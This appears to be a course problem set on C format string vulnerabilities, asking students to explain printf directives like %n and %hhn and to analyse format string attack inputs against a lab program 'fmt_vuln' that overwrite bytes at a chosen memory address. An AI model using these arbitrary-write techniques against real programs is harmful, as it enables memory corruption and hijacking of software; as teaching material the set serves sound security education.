Questions
=========

1.  Describe, briefly, what each of the formats present the result. For
    example, you might say for “%s” that it format prints a string, and
    for “%2s” you might say that it prints 2 bytes of a string.

    1.  `%n`

    2.  `%hn`

    3.  `%hhn`

    4.  `%hhx`

    5.  `%10$x`

    6.  `%p`

    7.  `%08x`

    8.  `%8x`

    9.  `%03.2f`

2.  What is the output from the following example format? **Explain.**

        int a;
        printf(“%0.10s%n\n”, “Go Navy! Beat Army!”, &a);
        printf(“%d”,a);

3.  Consider the following program code

        int i=0;
        int a;
        char buf[100];
        while( scanf(“%s%n”,buf,&a) > 0){
          printf(“%#x: %s (%d)”, i, buf, a);

         }     

    What do you expect the output of the second `printf()` will be given
    some user’s input? **Explain**.

4.  Consider the following code:

        char outputbuf[128];
        sprintf(outputbuf,inputbuf)

    Provide a format for `inputbuf` that uses a % directective that
    overflows outputbuf by 5 bytes. **Explain why this works.**

5.  For the following format print below why does this print `d`? Use a
    stack digram to help explain.

        void foo(int d){
          printf("The value of d is: %10$d\n");
        }

6.  Consider the following code:

        void foo(){
           int d = 10;
           printf("The value of d is: %d\n",d);
           printf("%x\n");
        }

    What do you expect the output of the second `printf()` will be?
    **Explain**.

7.  When conducting a format string attack, consider the following
    format and output:

        $ ./fmt_vuln BBBB.%#08x.%#08x.%#08x.%#08x

        Right: BBBB.%#08x.%#08x.%#08x.%#08x

        Wrong: BBBB.0xbffff2b0.0x000400.0x000004.0x42424242

        [*] test_val @ 0x804a02c = 4276545 0x00414141 

    What about `Wrong` output is instructive about what is currently be
    referenced by the last %\#08x format directive?

8.  Consider the format string attack below:

        $ ./fmt_vuln $(printf "\x2c\xa0\x04\x08").%#08x.%#08x.%#08x.%hhn

        Right: ,.%#08x.%#08x.%#08x.%hhn

        Wrong: ,.0xbffff2b0.0x000400.0x000004.

        [*] test_val @ 0x804a02c = 4276514 0x00414122

    Explain how the `$(printf \x2c\xa0\x04\x08)` and the `%hhn` format
    directive allows the attacker to write a single byte

9.  Consider the format string attack below:

        user@si485H-base:demo$ ./fmt_vuln $(printf "\x2f\xa0\x04\x08")AAAAAAAAAAAAAAAAAAAAAAA.%#08x.%#08x.%#08x.%hhn

        Right: /AAAAAAAAAAAAAAAAAAAAAAA.%#08x.%#08x.%#08x.%hhn

        Wrong: /AAAAAAAAAAAAAAAAAAAAAAA.0xbffff290.0x000400.0x000004.

        [*] test_val @ 0x804a02c = 960577857 0x39414141

    If we wanted 0x99 to be the value instead of 0x39 when writing the
    byte, what would we change the format directive to be? **Explain.**

10. Consider the below format string attack input: (note: lines ending
    with  ∖  are continuations)

        $ ./fmt_vuln $(printf "\x2f\xa0\x04\x08")\
        $(printf "\x2e\xa0\x04\x08")\
        $(printf "\x2d\xa0\x04\x08")\
        $(printf "\x2c\xa0\x04\x08")\
        .%4\$08x.%4\$08x.%5\$08x.%\5\$08x.%6\$08x.%\6\$08x.%7\$08x.%\7\$08x

    1.  Which of the format directives should be chnaged to `%hhn`?
        **Explain.**

    2.  Why are all the format lengths predsecribed prior to changing to
        `%hhn`? What would happen if we built the format length one part
        at a time?

    3.  Explain why the  ∖  portion of the format? What is it used for
        in the format directive? And, why is it escaped with a  ∖  ?
